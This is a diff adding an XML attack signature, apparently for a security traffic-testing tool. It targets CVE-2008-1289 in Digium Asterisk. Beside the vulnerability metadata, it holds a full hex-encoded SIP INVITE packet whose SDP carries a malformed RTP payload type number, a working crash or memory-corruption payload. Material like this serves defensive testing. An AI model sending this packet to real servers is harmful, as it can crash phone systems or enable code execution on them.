@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Digium Asterisk Invalid RTP Payload Type Number Memory Corruption"/>
+    <EngDesc display="true" value="There exists a memory corruption vulnerability in Digium Asterisk product. The vulnerability is due to insufficient validation of user-supplied data in the Session Description Protocol (SDP) payload. The vulnerability can be exploited by remote unauthenticated attackers by sending a request containing a malicious value in the payload. Successful exploitation of this vulnerability may allow an attacker to corrupt memory and cause denial-of-service condition, or possibly execute arbitrary code in the context of the affected service. Upon a successful attack, the vulnerable Asterisk server will allow execution of code with the privileges of the service. In a case where code injection is not successful, the service will terminate, creating a denial of service condition. The service needs to be restarted manually to restore the functionality."/>
+    <Intent display="true">
+      <item value="Code_Execution/Memory_Corruption"/>
+    </Intent>
+    <Protocol display="true" value="SIP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Digium"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Digium_Asterisk_product"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Digium_Asterisk_1.4.x_prior_to_1.4.18.1_and_1.4.19-rc3&amp;1.6.x_prior_to_1.6.0-beta6/Digium_Asterisk_Appliance_Developer_Kit_prior_to_Asterisk_1.4_revision_109386/Digium_Asterisk_Business_Edition_C.x.x_prior_to_C.1.6.1/Digium_AsteriskNOW_Prior_to_1.0.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-1289"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="e90cce6f40839a663fdf8661b245688e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634006416854749829"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1265020205" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="SIPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="J"/>
+    <NamedVar name="SIPsourcePort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="I"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:17:A4:A7:84:23" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="02B7" Identification="2454" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$SIPsourcePort" destPort="$SIPdestPort" checksum="" length="02A3" Payload="494E56495445207369703A31303031403137322E31362E382E313132205349502F322E300A5669613A205349502F322E302F554450203137322E31362E382E3139373A353036303B72706F72743B6272616E63683D7A39684734624B32373832393838333435423938443141444433393236363533413033424331420A46726F6D3A205365636F6E6420457874656E73696F6E203C7369703A32303031403137322E31362E382E3131323E3B7461673D313533323130323636380A546F3A203C7369703A31303031403137322E31362E382E3131323E0A436F6E746163743A203C7369703A32303031403137322E31362E382E3139373A353036303E0A43616C6C2D49443A2037333438444336432D443645302D343933362D433734372D423536313935383341394331403137322E31362E382E3139370A435365713A20333339313920494E564954450A4D61782D466F7277617264733A2037300A436F6E74656E742D547970653A206170706C69636174696F6E2F7364700A557365722D4167656E743A20582D4C6974652072656C656173652031313035640A436F6E74656E742D4C656E6774683A203132380A0A763D300A6F3D32303031203139333635393637362031393336353936383420494E20495034203137322E31362E382E3139370A733D582D4C6974650A633D494E20495034203137322E31362E382E3139370A743D3020300A6D3D617564696F2038303030205254502F415650203020382033203938203937203130310A613D7274706D61703A3931323334353637382070636D752F383030300A613D7274706D61703A312070636D752F383030310A613D7274706D61703A3130312074656C6570686F6E652D6576656E742F383030300A613D666D74703A31303120302D31350A613D73656E6472656376"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
